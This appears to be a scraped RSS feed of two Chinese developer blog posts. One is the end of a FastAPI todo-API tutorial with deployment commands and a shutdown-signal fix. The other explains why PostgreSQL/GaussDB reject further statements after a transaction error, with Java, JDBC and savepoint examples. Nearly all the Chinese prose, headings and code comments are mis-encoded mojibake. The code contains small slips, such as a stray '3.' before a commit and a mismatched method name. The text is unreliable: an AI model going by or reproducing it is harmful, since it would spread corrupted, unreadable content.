    <span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">self, todo_id: UUID</span>) -&gt; <span class="hljs-built_in">bool</span>:
        <span class="hljs-keyword">for</span> idx, todo <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(self.todos):
            <span class="hljs-keyword">if</span> todo.<span class="hljs-built_in">id</span> == todo_id:
                <span class="hljs-keyword">del</span> self.todos[idx]
                <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>
        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>

<span class="hljs-comment"># ä¾èµ–æ³¨å…¥</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">get_db</span>():
    <span class="hljs-keyword">return</span> TodoDB()

<span class="hljs-comment"># APIè·¯ç”±</span>
<span class="hljs-meta">@app.get(<span class="hljs-params"><span class="hljs-string">"/todos"</span>, response_model=<span class="hljs-type">List</span>[TodoItem]</span>)</span>
<span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">list_todos</span>(<span class="hljs-params">db: TodoDB = Depends(<span class="hljs-params">get_db</span>)</span>):
    <span class="hljs-keyword">return</span> db.get_all()

<span class="hljs-meta">@app.get(<span class="hljs-params"><span class="hljs-string">"/todos/{todo_id}"</span>, response_model=TodoItem</span>)</span>
<span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">get_todo</span>(<span class="hljs-params">todo_id: UUID, db: TodoDB = Depends(<span class="hljs-params">get_db</span>)</span>):
    todo = db.get(todo_id)
    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> todo:
        <span class="hljs-keyword">raise</span> HTTPException(status_code=<span class="hljs-number">404</span>, detail=<span class="hljs-string">"Todo not found"</span>)
    <span class="hljs-keyword">return</span> todo

<span class="hljs-meta">@app.post(<span class="hljs-params"><span class="hljs-string">"/todos"</span>, response_model=TodoItem</span>)</span>
<span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">create_todo</span>(<span class="hljs-params">todo: TodoItem, db: TodoDB = Depends(<span class="hljs-params">get_db</span>)</span>):
    <span class="hljs-keyword">return</span> db.create(todo)

<span class="hljs-meta">@app.put(<span class="hljs-params"><span class="hljs-string">"/todos/{todo_id}"</span>, response_model=TodoItem</span>)</span>
<span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">update_todo</span>(<span class="hljs-params">todo_id: UUID, updated_todo: TodoItem, db: TodoDB = Depends(<span class="hljs-params">get_db</span>)</span>):
    todo = db.update(todo_id, updated_todo)
    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> todo:
        <span class="hljs-keyword">raise</span> HTTPException(status_code=<span class="hljs-number">404</span>, detail=<span class="hljs-string">"Todo not found"</span>)
    <span class="hljs-keyword">return</span> todo

<span class="hljs-meta">@app.delete(<span class="hljs-params"><span class="hljs-string">"/todos/{todo_id}"</span></span>)</span>
<span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">delete_todo</span>(<span class="hljs-params">todo_id: UUID, db: TodoDB = Depends(<span class="hljs-params">get_db</span>)</span>):
    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> db.delete(todo_id):
        <span class="hljs-keyword">raise</span> HTTPException(status_code=<span class="hljs-number">404</span>, detail=<span class="hljs-string">"Todo not found"</span>)
    <span class="hljs-keyword">return</span> {<span class="hljs-string">"message"</span>: <span class="hljs-string">"Todo deleted successfully"</span>}
</code></pre>
<h2 data-id="heading-13">éƒ¨ç½²FastAPIåº”ç”¨</h2>
<p>ä½¿ç”¨Uvicornéƒ¨ç½²ï¼š</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># å¼€å‘ç¯å¢ƒï¼ˆå¸¦çƒ­é‡è½½ï¼‰</span>
uvicorn main:app --reload --host 0.0.0.0 --port 8000

<span class="hljs-comment"># ç”Ÿäº§ç¯å¢ƒ</span>
uvicorn main:app --host 0.0.0.0 --port 8000 --workers 4
</code></pre>
<p>ä½¿ç”¨Docker + uvicornéƒ¨ç½²ï¼š</p>
<pre><code class="hljs language-dockerfile" lang="dockerfile">FROM python:3.9

WORKDIR /code

COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt

COPY . .

CMD ["uvicorn", "main:app", "--host", "0.0.0.0", "--port", "80"]
</code></pre>
<h2 data-id="heading-14">å¸¸è§bug</h2>
<ol>
<li><kbd>Ctrl+C</kbd>æ— æ³•å…³é—­è¿›ç¨‹ï¼Œæ— æ³•è¿”å›ç»ˆç«¯prompt
å¦‚æœè¿è¡Œ<code>uv run uvicorn app.main:app --host 0.0.0.0 --port 8000 --reload</code>å°±æ— æ³•æ­£å¸¸å…³é—­ï¼Œåªèƒ½ç”¨Pythonè„šæœ¬æ¥è¿è¡Œã€‚å°±ç›´æ¥åœ¨å…¥å£è„šæœ¬ï¼ˆ<code>uvicorn.run()</code>çš„è„šæœ¬ï¼‰ä¸Šç›´æ¥åŠ ï¼š
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">receive_signal</span>(<span class="hljs-params">signalNumber, frame</span>):
    <span class="hljs-built_in">print</span>(<span class="hljs-string">'\nReceived signal:'</span>, signalNumber)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">'æ­£åœ¨å…³é—­FastAPIæœåŠ¡...'</span>)
    <span class="hljs-comment"># å¼ºåˆ¶é€€å‡ºï¼Œä¸ç­‰å¾…å­è¿›ç¨‹</span>
    os._exit(<span class="hljs-number">0</span>)

<span class="hljs-comment"># æ³¨å†Œä¿¡å·å¤„ç†</span>
signal.signal(signal.SIGINT, receive_signal)  <span class="hljs-comment"># å¤„ç†Ctrl+C</span>
signal.signal(signal.SIGTERM, receive_signal)  <span class="hljs-comment"># å¤„ç†ç»ˆæ­¢ä¿¡å·</span>
</code></pre>
å‚è€ƒèµ„æ–™ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fstackoverflow.com%2Fquestions%2F74116435" target="_blank" title="https://stackoverflow.com/questions/74116435" ref="nofollow noopener noreferrer">stackoverflow.com/questions/7â€¦</a></li>
</ol>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/f59d79eb36e242dab687d0ea1a7b688d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6K-456We57yE6buY5LiN6K-t:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770270213&amp;x-signature=J6KVu0ebYtI2Stc%2FUUaEtlgCmvg%3D" alt="image.png" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[# éœ‡æƒŠï¼GaussDBäº‹åŠ¡ä¸­æ–­åæ‹’ç»æ‰§è¡Œåç»­æ“ä½œ]]></title>    <link>https://juejin.cn/post/7600341731047129123</link>    <guid>https://juejin.cn/post/7600341731047129123</guid>    <pubDate>2026-01-29T05:58:55.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7600341731047129123" data-draft-id="7600341731047096355" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="# éœ‡æƒŠï¼GaussDBäº‹åŠ¡ä¸­æ–­åæ‹’ç»æ‰§è¡Œåç»­æ“ä½œ"/> <meta itemprop="keywords" content="Java,æ•°æ®åº“"/> <meta itemprop="datePublished" content="2026-01-29T05:58:55.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç”¨æˆ·903846366581"/> <meta itemprop="url" content="https://juejin.cn/user/1602415871147403"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            # éœ‡æƒŠï¼GaussDBäº‹åŠ¡ä¸­æ–­åæ‹’ç»æ‰§è¡Œåç»­æ“ä½œ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1602415871147403/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç”¨æˆ·903846366581
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-29T05:58:55.000Z" title="Thu Jan 29 2026 05:58:55 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    8
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">éœ‡æƒŠï¼GaussDBäº‹åŠ¡ä¸­æ–­åæ‹’ç»æ‰§è¡Œåç»­æ“ä½œï¼Œä½ çš„Javaç¨‹åºå¯èƒ½æ­£é¢ä¸´å·¨å¤§é£é™©ï¼</h2>
<h3 data-id="heading-1">1. ç”Ÿäº§é—®é¢˜å¼•å‡ºï¼š<code>current transaction is aborted, commands ignored until end of transaction block</code></h3>
<p>åœ¨ç”Ÿäº§ç¯å¢ƒä¸­ï¼ŒæŠ“å–åˆ°è¿™æ ·çš„é”™è¯¯ä¿¡æ¯ï¼š</p>
<pre><code class="hljs language-vbnet" lang="vbnet">org.postgresql.util.PSQLException: <span class="hljs-keyword">ERROR</span>: current transaction <span class="hljs-built_in">is</span> aborted, commands ignored <span class="hljs-keyword">until</span> <span class="hljs-keyword">end</span> <span class="hljs-keyword">of</span> transaction block
</code></pre>
<p>æ‰¾å¼€å‘ï¼Œäººå®¶åé¦ˆä¸šåŠ¡ä»£ç å½“ä¸­æ˜ç¡®æ•è·äº†å¼‚å¸¸çš„ï¼ï¼</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// é”™è¯¯çš„åšæ³•ç¤ºä¾‹</span>
<span class="hljs-meta">@Transactional</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">badExample</span><span class="hljs-params">()</span> {
    <span class="hljs-keyword">try</span> {
        userRepository.save(user);
        orderRepository.save(order); 
      
      	<span class="hljs-comment">// æ„é€ æ—¥å¿—ï¼Œä½†å†™åº“å¤±è´¥äº†ï¼šæ¯”å¦‚æŸä¸ªå­—æ®µè¶…é•¿ã€æ²¡æ»¡è¶³éç©ºçº¦æŸã€ä¸»é”®å†²çª...</span>
      	operateLogService.regiest(badLog); 
    } <span class="hljs-keyword">catch</span> (DataIntegrityViolationException e) {
        <span class="hljs-comment">// å³ä½¿æ•è·äº†å¼‚å¸¸ï¼Œäº‹åŠ¡ä»å¤„äºabortedçŠ¶æ€</span>
        auditLogRepository.save(auditLog); <span class="hljs-comment">// æ•´ä¸ªæ“ä½œéƒ½åºŸäº†ï¼Œå‰é¢çš„æ­£å¸¸æ“ä½œä¹Ÿæäº¤ä¸äº†</span>
    }
}
</code></pre>
<p>çº³å°¼ï¼ï¼ è¿™ä¸ªruleServiceå…¥åº“å› ä¸ºä¸€ä¸ªnot nullçº¦æŸå¯¼è‡´å¤±è´¥ï¼Œå±…ç„¶è®©ä¸»ä¸šåŠ¡çš„å…¥åº“ä¹Ÿå¤±è´¥äº†ï¼ï¼</p>
<p><strong>ç‰¹æ³¨ï¼šè¿™ä¸æ˜¯ä¸ªæ€§ä¸“æœ‰æ•°æ®åº“æ‰å‡ºç°çš„æƒ…å†µï¼Œåœ¨è¿™ç§ä»£ç å®ç°ä¸‹ï¼Œå½“å‰è¿™äº›æ•°æ®åº“éƒ½ä¼šå¤±è´¥ï¼Œé™¤éä½ æ˜¾æ€§åšé¢å¤–å¤„ç†ï¼</strong></p>
<h3 data-id="heading-2">2. é—®é¢˜å¤ç°</h3>
<p>èµ¶ç´§å†™ä¸ªç¨‹åºéªŒè¯ä¸€ä¸‹ã€‚</p>
<ol>
<li>å‡†å¤‡ä¸€å¼ æµ‹è¯•è¡¨</li>
</ol>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-keyword">create</span> <span class="hljs-keyword">table</span> t_test ( name <span class="hljs-type">varchar</span>(<span class="hljs-number">20</span>) <span class="hljs-keyword">not</span> <span class="hljs-keyword">null</span>);
</code></pre>
<ol start="2">
<li>
<p>ç”¨åŸç”Ÿjdbcæ¨¡æ‹Ÿæ“ä½œ</p>
<blockquote>
<p>ä¼ ç»Ÿè®¤è¯†ï¼šæ‰§è¡Œå®Œä¼šæœ‰aaï¼Œbbä¸¤æ¡è®°å½•ã€‚ä½†å®é™…ä¸Šï¼Œå•¥ä¹Ÿæ²¡æœ‰...</p>
</blockquote>
</li>
</ol>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// è¿™é‡Œå°±æ˜¯è·å–è¿æ¥ï¼Œä¸é‡è¦ï¼Œå¯è‡ªå·±å†™</span>
<span class="hljs-type">Connection</span> <span class="hljs-variable">conn</span> <span class="hljs-operator">=</span> JdbcUtil.initConnection();

<span class="hljs-comment">// å…³é—­äº‹åŠ¡è‡ªåŠ¨æäº¤</span>
conn.setAutoCommit(<span class="hljs-literal">false</span>);

<span class="hljs-comment">// 1. æ¨¡æ‹Ÿä¸»ä¸šåŠ¡çš„æ­£å¸¸æ“ä½œ</span>
<span class="hljs-type">PreparedStatement</span> <span class="hljs-variable">pstm</span> <span class="hljs-operator">=</span> conn.prepareStatement(<span class="hljs-string">"insert into t_test(name) values (?)"</span>);
pstm.setString(<span class="hljs-number">1</span>, <span class="hljs-string">"aa"</span>);
pstm.executeUpdate();

<span class="hljs-comment">// 2. å‡†å¤‡æ‰§è¡Œæ“ä½œï¼šæ’å…¥ä¸€æ¡""è®°å½•ï¼Œé¢„ä¼°å¤±è´¥ï¼Œæ•è·å¼‚å¸¸ï¼Œæ’å…¥bbè®°å½•</span>
<span class="hljs-keyword">try</span>{
		pstm.setString(<span class="hljs-number">1</span>, <span class="hljs-string">""</span>);
		pstm.executeUpdate();
} <span class="hljs-keyword">catch</span>(Exception e){
    System.out.println(e);
  	pstm.setString(<span class="hljs-number">1</span>, <span class="hljs-string">"bb"</span>);
  	pstm.executeUpdate();
}

<span class="hljs-comment">// æ­£å¸¸æäº¤</span>
<span class="hljs-number">3.</span> conn.commit();
</code></pre>
<ol start="3">
<li>æŸ¥çœ‹æ•°æ®åº“</li>
</ol>
<pre><code class="hljs language-css" lang="css">æœŸæœ›ï¼šæ•°æ®åº“ä¸­æœ‰ä¸¤æ¡è®°å½•ï¼šaaï¼Œbbã€‚ä½†å®é™…ä¸Šï¼Œå•¥ä¹Ÿæ²¡æœ‰... å•¥ä¹Ÿä¸æ˜¯

çªç„¶æƒ³èµ·è¿™æ ·çš„ä¸šåŠ¡æµç¨‹è®¾è®¡ï¼š
	å…ˆå†™<span class="hljs-selector-tag">A</span>è¡¨ï¼›å†å†™<span class="hljs-selector-tag">B</span>è¡¨ï¼Œå¦‚æœå¤±è´¥äº†ï¼ŒCè¡¨ç™»è®°ä¸€æ¡å¼‚å¸¸è®°å½•ï¼›
äº¤æ˜“ç»“æŸï¼Œç³»ç»Ÿä¿å­˜<span class="hljs-selector-tag">A</span>ï¼Œ<span class="hljs-selector-tag">B</span> æˆ–è€…<span class="hljs-selector-tag">A</span>ï¼ŒC
</code></pre>
<p><strong>è¿™ç§éœ€æ±‚ä¸å°‘ï¼Œå®ç°éƒ½è¿™æ ·çš„ã€‚ ä¸è¡Œï¼Œèµ¶ç´§æ”¹ä»£ç å», ğŸ˜­ğŸ˜­</strong></p>
<h3 data-id="heading-3">3. å¸¸è§è¯¯è§£ï¼š@Transactionalæ–¹æ³•å†…æ•è·å¼‚å¸¸çš„é™·é˜±</h3>
<p>è®¸å¤šå¼€å‘è€…å­˜åœ¨ä¸€ä¸ªå¸¸è§è¯¯è§£ï¼š<strong>åœ¨<code>@Transactional</code>æ³¨è§£çš„æ–¹æ³•å†…éƒ¨æ•è·å¼‚å¸¸å°±èƒ½è®©é€»è¾‘ç¬¦åˆæœŸæœ›çš„æ‰§è¡Œ</strong>ã€‚å¦‚</p>
<p>è¿™ç§ç†è§£åœ¨æŸäº›æ•°æ®åº“ç³»ç»Ÿä¸­æ˜¯æ­£ç¡®çš„ï¼Œä½†åœ¨PostgreSQLå’ŒGaussDBä¸­å´è¡Œä¸é€šã€‚</p>
<h4 data-id="heading-4">ä¼ ç»Ÿè®¤çŸ¥ vs ç°å®æƒ…å†µ</h4>
<p><strong>ä¼ ç»Ÿè®¤çŸ¥</strong>ï¼š</p>
<ul>
<li>åœ¨<code>@Transactional</code>æ–¹æ³•ä¸­å‘ç”Ÿå¼‚å¸¸</li>
<li>ä½¿ç”¨try-catchæ•è·å¼‚å¸¸</li>
<li>æ‰§è¡Œè¡¥å¿é€»è¾‘</li>
<li>æ“ä½œéƒ½å¯ä»¥æ­£å¸¸è¿›è¡Œ</li>
</ul>
<p><strong>ç°å®æƒ…å†µï¼ˆPostgreSQL/GaussDBï¼‰</strong>ï¼š</p>
<ul>
<li>ä¸€æ—¦äº‹åŠ¡ä¸­çš„ä»»ä½•SQLè¯­å¥å¤±è´¥</li>
<li>æ•´ä¸ªäº‹åŠ¡è¿›å…¥"aborted"çŠ¶æ€</li>
<li>å³ä½¿åœ¨åº”ç”¨å±‚æ•è·äº†å¼‚å¸¸</li>
<li>åç»­çš„æ‰€æœ‰SQLæ“ä½œéƒ½ä¼šå¤±è´¥</li>
</ul>
<h4 data-id="heading-5">PostgreSQL/GaussDB è¡Œä¸º</h4>
<ul>
<li>äº‹åŠ¡ä¸­ä»»ä½•é”™è¯¯éƒ½ä¼šå¯¼è‡´æ•´ä¸ªäº‹åŠ¡è¿›å…¥"aborted"çŠ¶æ€</li>
<li>åç»­æ‰€æœ‰SQLå‘½ä»¤éƒ½ä¼šè¢«å¿½ç•¥ï¼Œç›´åˆ°äº‹åŠ¡ç»“æŸ</li>
<li>å¿…é¡»æ‰§è¡ŒROLLBACKæˆ–COMMITæ¥é€€å‡ºabortedçŠ¶æ€</li>
<li>è¿™ç§è®¾è®¡ä¿è¯äº†æ•°æ®çš„ä¸€è‡´æ€§ï¼Œä½†é™åˆ¶äº†çµæ´»æ€§</li>
</ul>
<h4 data-id="heading-6">MySQL è¡Œä¸ºï¼ˆé»˜è®¤éš”ç¦»çº§åˆ«ï¼‰</h4>
<ul>
<li>å¯¹äºéäº‹åŠ¡æ€§å­˜å‚¨å¼•æ“ï¼Œè¡Œä¸ºç±»ä¼¼PostgreSQL</li>
<li>å¯¹äºInnoDBå­˜å‚¨å¼•æ“ï¼Œæ”¯æŒSAVEPOINT</li>
<li>å¯ä»¥åœ¨äº‹åŠ¡ä¸­è®¾ç½®ä¿å­˜ç‚¹ï¼Œéƒ¨åˆ†å›æ»šåˆ°ä¿å­˜ç‚¹</li>
<li>ç›¸å¯¹æ›´çµæ´»ï¼Œä½†éœ€è¦æ˜¾å¼ä½¿ç”¨SAVEPOINT</li>
</ul>
<pre><code class="hljs language-sql" lang="sql"><span class="hljs-comment">-- MySQLä¸­ä½¿ç”¨SAVEPOINTçš„ä¾‹å­</span>
<span class="hljs-keyword">BEGIN</span>;
<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> users <span class="hljs-keyword">VALUES</span> (<span class="hljs-number">1</span>, <span class="hljs-string">'Alice'</span>);
<span class="hljs-keyword">SAVEPOINT</span> sp1;
<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> orders <span class="hljs-keyword">VALUES</span> (<span class="hljs-number">1</span>, <span class="hljs-string">'invalid_order'</span>); <span class="hljs-comment">-- å¤±è´¥</span>
<span class="hljs-keyword">ROLLBACK</span> <span class="hljs-keyword">TO</span> <span class="hljs-keyword">SAVEPOINT</span> sp1; <span class="hljs-comment">-- å›æ»šåˆ°ä¿å­˜ç‚¹</span>
<span class="hljs-keyword">INSERT</span> <span class="hljs-keyword">INTO</span> orders <span class="hljs-keyword">VALUES</span> (<span class="hljs-number">1</span>, <span class="hljs-string">'valid_order'</span>); <span class="hljs-comment">-- æˆåŠŸ</span>
<span class="hljs-keyword">COMMIT</span>;
</code></pre>
<h4 data-id="heading-7">Oracle è¡Œä¸º</h4>
<ul>
<li>ç±»ä¼¼PostgreSQLï¼Œé”™è¯¯ä¼šå¯¼è‡´å½“å‰äº‹åŠ¡çŠ¶æ€å¼‚å¸¸</li>
<li>æ”¯æŒSAVEPOINTæœºåˆ¶</li>
<li>å¯ä»¥å›æ»šåˆ°ç‰¹å®šä¿å­˜ç‚¹è€Œä¸å½±å“æ•´ä¸ªäº‹åŠ¡</li>
<li>éœ€è¦æ˜¾å¼çš„é”™è¯¯å¤„ç†å’Œä¿å­˜ç‚¹ç®¡ç†</li>
</ul>
<h4 data-id="heading-8">å…³é”®å·®å¼‚æ€»ç»“</h4>





























<table><thead><tr><th>æ•°æ®åº“</th><th>é”™è¯¯åè¡Œä¸º</th><th>æ¢å¤æ–¹å¼</th><th>çµæ´»æ€§</th></tr></thead><tbody><tr><td>PostgreSQL/GaussDB</td><td>äº‹åŠ¡abortedï¼Œåç»­å‘½ä»¤è¢«å¿½ç•¥</td><td>ROLLBACKæˆ–é‡æ–°å¼€å§‹äº‹åŠ¡</td><td>ä½</td></tr><tr><td>MySQL(InnoDB)</td><td>å¯ä½¿ç”¨SAVEPOINTéƒ¨åˆ†æ¢å¤</td><td>SAVEPOINT + ROLLBACK TO SAVEPOINT</td><td>ä¸­ç­‰</td></tr><tr><td>Oracle</td><td>å¯ä½¿ç”¨SAVEPOINTéƒ¨åˆ†æ¢å¤</td><td>SAVEPOINT + ROLLBACK TO SAVEPOINT</td><td>ä¸­ç­‰</td></tr></tbody></table>
<p>è¿™ç§å·®å¼‚æ„å‘³ç€åŒæ ·çš„Javaä»£ç åœ¨ä¸åŒæ•°æ®åº“ä¸Šå¯èƒ½è¡¨ç°å®Œå…¨ä¸åŒï¼Œç‰¹åˆ«æ˜¯åœ¨æ¶‰åŠå¤æ‚äº‹åŠ¡é€»è¾‘çš„åº”ç”¨ä¸­ã€‚</p>
<h3 data-id="heading-9">4. Javaç¼–ç¨‹æ¨èå®è·µ</h3>
<p>é¢å¯¹PostgreSQL/GaussDBçš„è¿™ç§äº‹åŠ¡è¡Œä¸ºï¼Œæˆ‘ä»¬éœ€è¦é‡‡ç”¨ä¸åŒçš„ç­–ç•¥æ¥å¤„ç†äº‹åŠ¡ä¸­çš„é”™è¯¯ï¼š</p>
<h4 data-id="heading-10">4.1 ä½¿ç”¨ç‹¬ç«‹çš„äº‹åŠ¡ åšä¸å½±å“ä¸»ä¸šåŠ¡çš„äº‹æƒ…</h4>
<p>æœ€ç›´æ¥çš„è§£å†³æ–¹æ¡ˆæ˜¯å°†é”™è¯¯æ—¥å¿—è®°å½•æ”¾åœ¨ç‹¬ç«‹çš„äº‹åŠ¡ä¸­</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// çœç•¥æ³¨å…¥</span>
<span class="hljs-meta">@Transactional</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">createUserWithOrder</span><span class="hljs-params">(User user, Order order)</span> {
      userRepository.save(user);
      orderRepository.save(order);

  		<span class="hljs-comment">// ç‹¬ç«‹å­äº‹åŠ¡ã€ååƒå¼‚å¸¸</span>
      logService.busiLog(logvo);
}

<span class="hljs-meta">@Slf4j</span>
<span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LogService</span> {
    
    <span class="hljs-meta">@Transactional(propagation = Propagation.REQUIRES_NEW)</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">logError</span><span class="hljs-params">(logvo)</span> {
       <span class="hljs-keyword">try</span>{
       	 logRepository.save(logvo);
       } <span class="hljs-keyword">catch</span>(Exception e){
         <span class="hljs-comment">// åªæ‰“æ—¥å¿—ï¼Œä¸æŠ›å¼‚å¸¸</span>
         log.error(e);
       }
    }
}
</code></pre>
